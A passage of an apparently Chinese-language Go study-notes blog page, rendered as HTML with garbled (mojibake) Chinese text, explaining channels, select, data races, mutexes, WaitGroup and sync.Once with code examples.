class="hljs-comment">// ä¸€ä¸ªå®¹é‡ä¸º2çš„ç¼“å†²é€šé“</span><br>c &lt;- <span class="hljs-number">3</span><br>c &lt;- <span class="hljs-number">5</span><br><span class="hljs-built_in">close</span>(c)<br>fmt.Println(<span class="hljs-built_in">len</span>(c), <span class="hljs-built_in">cap</span>(c)) <span class="hljs-comment">// 2 2</span><br>x, ok := &lt;-c<br>fmt.Println(x, ok) <span class="hljs-comment">// 3 true</span><br>fmt.Println(<span class="hljs-built_in">len</span>(c), <span class="hljs-built_in">cap</span>(c)) <span class="hljs-comment">// 1 2</span><br>x, ok = &lt;-c<br>fmt.Println(x, ok) <span class="hljs-comment">// 5 true</span><br>fmt.Println(<span class="hljs-built_in">len</span>(c), <span class="hljs-built_in">cap</span>(c)) <span class="hljs-comment">// 0 2</span><br>x, ok = &lt;-c<br>fmt.Println(x, ok) <span class="hljs-comment">// 0 false</span><br>x, ok = &lt;-c<br>fmt.Println(x, ok) <span class="hljs-comment">// 0 false</span><br>fmt.Println(<span class="hljs-built_in">len</span>(c), <span class="hljs-built_in">cap</span>(c)) <span class="hljs-comment">// 0 2</span><br><span class="hljs-built_in">close</span>(c) <span class="hljs-comment">// æ­¤è¡Œå°†äº§ç”Ÿä¸€ä¸ªææ…Œ</span><br>c &lt;- <span class="hljs-number">7</span>   <span class="hljs-comment">// å¦‚æœä¸Šä¸€è¡Œä¸å­˜åœ¨ï¼Œæ­¤è¡Œä¹Ÿå°†äº§ç”Ÿä¸€ä¸ªææ…Œã€‚</span><br></code></pre></td></tr></table></figure><h3 id="selectæµç¨‹æ§åˆ¶"><a href="#selectæµç¨‹æ§åˆ¶" class="headerlink" title="selectæµç¨‹æ§åˆ¶"></a>selectæµç¨‹æ§åˆ¶</h3><p>å¤šè·¯å¤ç”¨å¯ä»¥ç®€å•åœ°ç†è§£ä¸ºï¼ŒN ä¸ª channel ä¸­ï¼Œä»»æ„ä¸€ä¸ª channel æœ‰æ•°æ®äº§ç”Ÿï¼Œselect éƒ½å¯ä»¥ç›‘å¬åˆ°ï¼Œç„¶åæ‰§è¡Œç›¸åº”çš„åˆ†æ”¯ï¼Œæ¥æ”¶æ•°æ®å¹¶å¤„ç†ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>   <span class="hljs-comment">//å£°æ˜ä¸‰ä¸ªå­˜æ”¾ç»“æœçš„channel</span><br> <br>   firstCh := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">string</span>)<br>   secondCh := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">string</span>)<br>   threeCh := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">string</span>)<br> <br>   <span class="hljs-comment">//åŒæ—¶å¼€å¯3ä¸ªgoroutineä¸‹è½½</span><br> <br>   <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>      firstCh &lt;- downloadFile(<span class="hljs-string">&quot;firstCh&quot;</span>)<br>   &#125;()<br> <br>   <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>      secondCh &lt;- downloadFile(<span class="hljs-string">&quot;secondCh&quot;</span>)<br>   &#125;()<br> <br>   <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>      threeCh &lt;- downloadFile(<span class="hljs-string">&quot;threeCh&quot;</span>)<br>   &#125;()<br> <br>   <span class="hljs-comment">//å¼€å§‹selectå¤šè·¯å¤ç”¨ï¼Œå“ªä¸ªchannelèƒ½è·å–åˆ°å€¼ï¼Œå°±è¯´æ˜å“ªä¸ªæœ€å…ˆä¸‹è½½å¥½ï¼Œå°±ç”¨å“ªä¸ªã€‚</span><br> <br>   <span class="hljs-keyword">select</span> &#123;<br> <br>   <span class="hljs-keyword">case</span> filePath := &lt;-firstCh:<br>      fmt.Println(filePath)<br> <br>   <span class="hljs-keyword">case</span> filePath := &lt;-secondCh:<br>      fmt.Println(filePath)<br> <br>   <span class="hljs-keyword">case</span> filePath := &lt;-threeCh:<br>      fmt.Println(filePath)<br>   &#125;<br>&#125;<br> <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">downloadFile</span><span class="hljs-params">(chanName <span class="hljs-keyword">string</span>)</span> <span class="hljs-title">string</span></span> &#123;<br>   <span class="hljs-comment">//æ¨¡æ‹Ÿä¸‹è½½æ–‡ä»¶,å¯ä»¥è‡ªå·±éšæœºtime.Sleepç‚¹æ—¶é—´è¯•è¯•</span><br> <br>   time.Sleep(time.Second)<br>   <span class="hljs-keyword">return</span> chanName+<span class="hljs-string">&quot;:filePath&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="å…±äº«å˜é‡çš„å¹¶å‘"><a href="#å…±äº«å˜é‡çš„å¹¶å‘" class="headerlink" title="å…±äº«å˜é‡çš„å¹¶å‘"></a>å…±äº«å˜é‡çš„å¹¶å‘</h2><p><a href="https://lailin.xyz/post/go-training-week3-sync.html">æ·±å…¥æºç </a></p><h3 id="å‡ºç°çš„é—®é¢˜"><a href="#å‡ºç°çš„é—®é¢˜" class="headerlink" title="å‡ºç°çš„é—®é¢˜"></a>å‡ºç°çš„é—®é¢˜</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-keyword">var</span> a, b <span class="hljs-keyword">int</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">f</span><span class="hljs-params">()</span></span> &#123;<br>a = <span class="hljs-number">1</span><br>b = <span class="hljs-number">2</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">g</span><span class="hljs-params">()</span></span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;b=&quot;</span>,b)<br>fmt.Println(<span class="hljs-string">&quot;a=&quot;</span>,a)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">go</span> f()<br>g()<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/08/13/GO%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220813225331713.png" alt="image-20220813225331713"></p><p>ä»¥ä¸Šä»£ç æœ‰å››ç§å¯èƒ½çš„è¾“å‡º</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go">b=<span class="hljs-number">2</span>,a=<span class="hljs-number">1</span>  <span class="hljs-comment">//1-2-3-4</span><br>b=<span class="hljs-number">0</span>,a=<span class="hljs-number">0</span>  <span class="hljs-comment">//3-4-1-2</span><br>b=<span class="hljs-number">0</span>,a=<span class="hljs-number">1</span>  <span class="hljs-comment">//3-1-2-4</span><br>b=<span class="hljs-number">2</span>,a=<span class="hljs-number">0</span>  <span class="hljs-comment">//2-3-4-1</span><br></code></pre></td></tr></table></figure><p>æ— è®ºä»»ä½•æ—¶å€™ï¼Œåªè¦æœ‰ä¸¤ä¸ªgoroutineå¹¶å‘è®¿é—®åŒä¸€å˜é‡ï¼Œä¸”è‡³å°‘å…¶ä¸­çš„ä¸€ä¸ªæ˜¯å†™æ“ä½œçš„æ—¶å€™å°±ä¼šå‘ç”Ÿæ•°æ®ç«äº‰ã€‚å¹¶ä¸”ï¼Œåœ¨ä¸å½±å“è¯­è¨€è§„èŒƒå¯¹ goroutine çš„è¡Œä¸ºå®šä¹‰çš„æ—¶å€™ï¼Œç¼–è¯‘å™¨å’Œ CPU ä¼šå¯¹è¯»å–å’Œå†™å…¥çš„é¡ºåºè¿›è¡Œé‡æ–°æ’åºã€‚</p><p>æ‰€æœ‰å¹¶å‘çš„é—®é¢˜éƒ½å¯ä»¥ç”¨ä¸€è‡´çš„ã€ç®€å•çš„æ—¢å®šçš„æ¨¡å¼æ¥è§„é¿ã€‚æ‰€ä»¥å¯èƒ½çš„è¯ï¼Œå°†å˜é‡é™å®šåœ¨goroutineå†…éƒ¨ï¼›å¦‚æœæ˜¯å¤šä¸ªgoroutineéƒ½éœ€è¦è®¿é—®çš„å˜é‡ï¼Œä½¿ç”¨äº’æ–¥æ¡ä»¶æ¥è®¿é—®ã€‚</p><h3 id="sync-Mutexäº’æ–¥é”"><a href="#sync-Mutexäº’æ–¥é”" class="headerlink" title="sync.Mutexäº’æ–¥é”"></a>sync.Mutexäº’æ–¥é”</h3><p>å¯ä»¥ä½¿ç”¨ä¸€ä¸ªå®¹é‡åªæœ‰1çš„channelæ¥ä¿è¯æœ€å¤šåªæœ‰ä¸€ä¸ªgoroutineåœ¨åŒä¸€æ—¶åˆ»è®¿é—®ä¸€ä¸ªå…±äº«å˜é‡ã€‚ä¸€ä¸ªåªèƒ½ä¸º1å’Œ0çš„ä¿¡å·é‡å«åšäºŒå…ƒä¿¡å·é‡(binary semaphore)ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> (<br>    sema    = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;, <span class="hljs-number">1</span>) <span class="hljs-comment">// a binary semaphore guarding balance</span><br>    balance <span class="hljs-keyword">int</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Deposit</span><span class="hljs-params">(amount <span class="hljs-keyword">int</span>)</span></span> &#123;<br>    sema &lt;- <span class="hljs-keyword">struct</span>&#123;&#125;&#123;&#125; <span class="hljs-comment">// acquire token</span><br>    balance = balance + amount<br>    &lt;-sema <span class="hljs-comment">// release token</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Balance</span><span class="hljs-params">()</span> <span class="hljs-title">int</span></span> &#123;<br>    sema &lt;- <span class="hljs-keyword">struct</span>&#123;&#125;&#123;&#125; <span class="hljs-comment">// acquire token</span><br>    b := balance<br>    &lt;-sema <span class="hljs-comment">// release token</span><br>    <span class="hljs-keyword">return</span> b<br>&#125;<br></code></pre></td></tr></table></figure><p>syncåŒ…é‡Œçš„Mutexç±»å‹å¯ä»¥ç›´æ¥æ”¯æŒã€‚å®ƒçš„Lockæ–¹æ³•èƒ½å¤Ÿè·å–åˆ°token(è¿™é‡Œå«é”)ï¼Œå¹¶ä¸”Unlockæ–¹æ³•ä¼šé‡Šæ”¾è¿™ä¸ªtokenã€‚</p><p>å¦‚æœå…¶å®ƒçš„goroutineå·²ç»è·å¾—äº†è¿™ä¸ªé”çš„è¯ï¼Œè¿™ä¸ªæ“ä½œä¼šè¢«é˜»å¡ç›´åˆ°å…¶å®ƒgoroutineè°ƒç”¨äº†Unlockä½¿è¯¥é”å˜å›å¯ç”¨çŠ¶æ€ã€‚mutexä¼šä¿æŠ¤å…±äº«å˜é‡ã€‚</p><p>å°½é‡ä½¿ç”¨deferæ¥å°†ä¸´ç•ŒåŒºæ‰©å±•åˆ°å‡½æ•°çš„ç»“æŸã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;sync&quot;</span><br><br><span class="hljs-keyword">var</span> (<br>    mu      sync.Mutex <span class="hljs-comment">// guards balance</span><br>    balance <span class="hljs-keyword">int</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Withdraw</span><span class="hljs-params">(amount <span class="hljs-keyword">int</span>)</span> <span class="hljs-title">bool</span></span> &#123;<br>    mu.Lock()<br>    <span class="hljs-keyword">defer</span> mu.Unlock()<br>    deposit(-amount)<br>    <span class="hljs-keyword">if</span> balance &lt; <span class="hljs-number">0</span> &#123;<br>        deposit(amount)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span> <span class="hljs-comment">// insufficient funds</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Deposit</span><span class="hljs-params">(amount <span class="hljs-keyword">int</span>)</span></span> &#123;<br>    mu.Lock()<br>    <span class="hljs-keyword">defer</span> mu.Unlock()<br>    deposit(amount)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Balance</span><span class="hljs-params">()</span> <span class="hljs-title">int</span></span> &#123;<br>    mu.Lock()<br>    <span class="hljs-keyword">defer</span> mu.Unlock()<br>    <span class="hljs-keyword">return</span> balance<br>&#125;<br><br><span class="hljs-comment">// This function requires that the lock be held.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">deposit</span><span class="hljs-params">(amount <span class="hljs-keyword">int</span>)</span></span> &#123; balance += amount &#125;<br></code></pre></td></tr></table></figure><p>æ²¡æ³•å¯¹ä¸€ä¸ªå·²ç»é”ä¸Šçš„mutexæ¥å†æ¬¡ä¸Šé”â€“è¿™ä¼šå¯¼è‡´ç¨‹åºæ­»é”ï¼Œæ²¡æ³•ç»§ç»­æ‰§è¡Œä¸‹å»ï¼ŒWithdrawä¼šæ°¸è¿œé˜»å¡ä¸‹å»ã€‚</p><p>è¿™æ ·çš„å†™æ³•æ˜¯é”™è¯¯çš„</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// <span class="hljs-doctag">NOTE:</span> incorrect!</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Withdraw</span><span class="hljs-params">(amount <span class="hljs-keyword">int</span>)</span> <span class="hljs-title">bool</span></span> &#123;<br>    mu.Lock()<br>    <span class="hljs-keyword">defer</span> mu.Unlock()<br>    Deposit(-amount)<br>    <span class="hljs-keyword">if</span> Balance() &lt; <span class="hljs-number">0</span> &#123;<br>        Deposit(amount)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span> <span class="hljs-comment">// insufficient funds</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="sync-RWMutexè¯»å†™é”"><a href="#sync-RWMutexè¯»å†™é”" class="headerlink" title="sync.RWMutexè¯»å†™é”"></a>sync.RWMutexè¯»å†™é”</h3><p>å…è®¸å¤šä¸ªåªè¯»æ“ä½œå¹¶è¡Œæ‰§è¡Œï¼Œä½†å†™æ“ä½œä¼šå®Œå…¨äº’æ–¥</p><p>RWMutexéœ€è¦æ›´å¤æ‚çš„å†…éƒ¨è®°å½•ï¼Œæ‰€ä»¥ä¼šè®©å®ƒæ¯”ä¸€èˆ¬çš„æ— ç«äº‰é”çš„mutexæ…¢ä¸€äº›ã€‚</p><p>sync.WaitGroup</p><p>ä¸€ä¸ª WaitGroup å¯¹è±¡å¯ä»¥ç­‰å¾…ä¸€ç»„åç¨‹ç»“æŸ ç®€å•ä½¿ç”¨å°±æ˜¯åœ¨åˆ›å»ºä¸€ä¸ªä»»åŠ¡çš„æ—¶å€™<code>wg.Add(1)</code>, ä»»åŠ¡å®Œæˆçš„æ—¶å€™ä½¿ç”¨<code>wg.Done()</code>æ¥å°†ä»»åŠ¡å‡ä¸€ã€‚ä½¿ç”¨<code>wg.Wait()</code>æ¥é˜»å¡ç­‰å¾…æ‰€æœ‰ä»»åŠ¡å®Œæˆã€‚</p><p>ä¾‹å­</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br> <br><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;sync&quot;</span><br>)<br> <br><span class="hljs-keyword">type</span> httpPkg <span class="hljs-keyword">struct</span>&#123;&#125;<br> <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(httpPkg)</span> <span class="hljs-title">Get</span><span class="hljs-params">(url <span class="hljs-keyword">string</span>)</span></span> &#123;&#125;<br> <br><span class="hljs-keyword">var</span> http httpPkg<br> <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-keyword">var</span> wg sync.WaitGroup<br>    <span class="hljs-keyword">var</span> urls = []<span class="hljs-keyword">string</span>&#123;<br>        <span class="hljs-string">&quot;&lt;http://www.golang.org/&gt;&quot;</span>,<br>        <span class="hljs-string">&quot;&lt;http://www.google.com/&gt;&quot;</span>,<br>        <span class="hljs-string">&quot;&lt;http://www.somestupidname.com/&gt;&quot;</span>,<br>    &#125;<br>    <span class="hljs-keyword">for</span> _, url := <span class="hljs-keyword">range</span> urls &#123;<br>        <span class="hljs-comment">// Increment the WaitGroup counter.</span><br>        wg.Add(<span class="hljs-number">1</span>)<br>        <span class="hljs-comment">// Launch a goroutine to fetch the URL.</span><br>        <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(url <span class="hljs-keyword">string</span>)</span></span> &#123;<br>            <span class="hljs-comment">// Decrement the counter when the goroutine completes.</span><br>            <span class="hljs-keyword">defer</span> wg.Done()<br>            <span class="hljs-comment">// Fetch the URL.</span><br>            http.Get(url)<br>        &#125;(url)<br>    &#125;<br>    <span class="hljs-comment">// Wait for all HTTP fetches to complete.</span><br>    wg.Wait()<br>&#125;<br></code></pre></td></tr></table></figure><p>æ³¨æ„ï¼šgolangé‡Œå¦‚æœæ–¹æ³•ä¼ é€’çš„ä¸æ˜¯åœ°å€ï¼Œé‚£ä¹ˆå°±ä¼šåšä¸€ä¸ªæ‹·è´ï¼Œè¿™é‡Œè°ƒç”¨çš„wgæ ¹æœ¬å°±ä¸æ˜¯ä¸€ä¸ªå¯¹è±¡ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-keyword">var</span> wg sync.WaitGroup<br>    ch := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">int</span>, <span class="hljs-number">1000</span>)<br>    <span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++ &#123;<br>        wg.Add(<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">go</span> doSomething(i, wg, ch)<br>    &#125;<br>    wg.Wait()<br>    fmt.Println(<span class="hljs-string">&quot;all done&quot;</span>)<br>    <span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++ &#123;<br>        dd := &lt;-ch<br>        fmt.Println(<span class="hljs-string">&quot;from ch:&quot;</span>+strconv.Itoa(dd))<br>    &#125;<br>&#125;<br> <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">doSomething</span><span class="hljs-params">(index <span class="hljs-keyword">int</span>, wg  sync.WaitGroup, ch <span class="hljs-keyword">chan</span> <span class="hljs-keyword">int</span>)</span></span> &#123;<br>    <span class="hljs-keyword">defer</span> wg.Done()<br>    fmt.Println(<span class="hljs-string">&quot;start done:&quot;</span> + strconv.Itoa(index))<br>    <span class="hljs-comment">//time.Sleep(20 * time.Millisecond)</span><br>    ch &lt;- index<br></code></pre></td></tr></table></figure><p>åº”è¯¥æ”¹ä¸º</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">go</span> doSomething(i, &amp;wg, ch)<br> <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">doSomething</span><span class="hljs-params">(index <span class="hljs-keyword">int</span>, wg *sync.WaitGroup, ch <span class="hljs-keyword">chan</span> <span class="hljs-keyword">int</span>)</span></span> &#123;<br>...<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="sync-Onceåˆå§‹åŒ–"><a href="#sync-Onceåˆå§‹åŒ–" class="headerlink" title="sync.Onceåˆå§‹åŒ–"></a>sync.Onceåˆå§‹åŒ–</h3><p><code>sync.Once</code>å¯ä»¥ä¿è¯<code>go</code>ç¨‹åºåœ¨è¿è¡ŒæœŸé—´çš„æŸæ®µä»£ç åªä¼šæ‰§è¡Œä¸€æ¬¡ï¼Œä½œç”¨ä¸<code>init</code>ç±»ä¼¼ï¼Œä½†æ˜¯ä¹Ÿæœ‰æ‰€ä¸åŒï¼š</p><ul><li><code>init</code>å‡½æ•°æ˜¯åœ¨æ–‡ä»¶åŒ…é¦–æ¬¡è¢«åŠ è½½çš„æ—¶å€™æ‰§è¡Œï¼Œä¸”åªæ‰§è¡Œä¸€æ¬¡ã€‚</li><li><code>sync.Once</code>æ˜¯åœ¨ä»£ç è¿è¡Œä¸­éœ€è¦çš„æ—¶å€™æ‰§è¡Œï¼Œä¸”åªæ‰§è¡Œä¸€æ¬¡ã€‚</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> (<br>o  sync.Once<br>wg sync.WaitGroup<br>)<br><br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++ &#123;<br>wg.Add(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(i <span class="hljs-keyword">int</span>)</span></span> &#123;<br><span class="hljs-keyword">defer</span> wg.Done()<br>o.Do(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;once&quot;</span>, i)<br>&#125;)<br>&#125;(i)<br>&#125;<br><br>wg.Wait()<br>&#125;<br><br><span class="hljs-comment">//è¾“å‡ºï¼šonce 9</span><br></code></pre></td></tr></table></figure><p>çœ‹çœ‹æºç </p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Once is an object that will perform exactly one action.</span><br><span class="hljs-keyword">type</span> Once <span class="hljs-keyword">struct</span> &#123;<br> <span class="hljs-comment">// done indicates whether the action has been performed.</span><br> <span class="hljs-comment">// It is first in the struct because it is used in the hot path.</span><br> <span class="hljs-comment">// The hot path is inlined at every call site.</span><br> <span class="hljs-comment">// Placing done first allows more compact instructions on some architectures (amd64/x86),</span><br> <span class="hljs-comment">// and fewer instructions (to calculate offset) on other architectures.</span><br> done <span class="hljs-keyword">uint32</span><br> m    Mutex<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(o *Once)</span> <span class="hljs-title">Do</span><span class="hljs-params">(f <span class="hljs-keyword">func</span>()</span>)</span> &#123;<br> <span class="hljs-keyword">if</span> atomic.LoadUint32(&amp;o.done) == <span class="hljs-number">0</span> &#123;<br>  o.doSlow(f)<br> &#125;<br>&#125;<br> <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(o *Once)</span> <span class="hljs-title">doSlow</span><span class="hljs-params">(f <span class="hljs-keyword">func</span>()</span>)</span> &#123;<br> o.m.Lock()<br> <span class="hljs-keyword">defer</span> o.m.Unlock()<br> <span class="hljs-keyword">if</span> o.done == <span class="hljs-number">0</span> &#123;<br>  <span class="hljs-keyword">defer</span> atomic.StoreUint32(&amp;o.done, <span class="hljs-number">1</span>)<br>  f()<br> &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨Do()ä¸­é¦–å…ˆåŸå­æ€§çš„è¯»å–doneå­—æ®µçš„å€¼æ˜¯å¦æ”¹å˜ï¼Œæ²¡æœ‰æ”¹å˜åˆ™æ‰§è¡ŒdoSlow()æ–¹æ³•.</p><p>ä¸€è¿›å…¥doslow()æ–¹æ³•å°±å¼€å§‹æ‰§è¡ŒåŠ é”æ“ä½œï¼Œè¿™æ 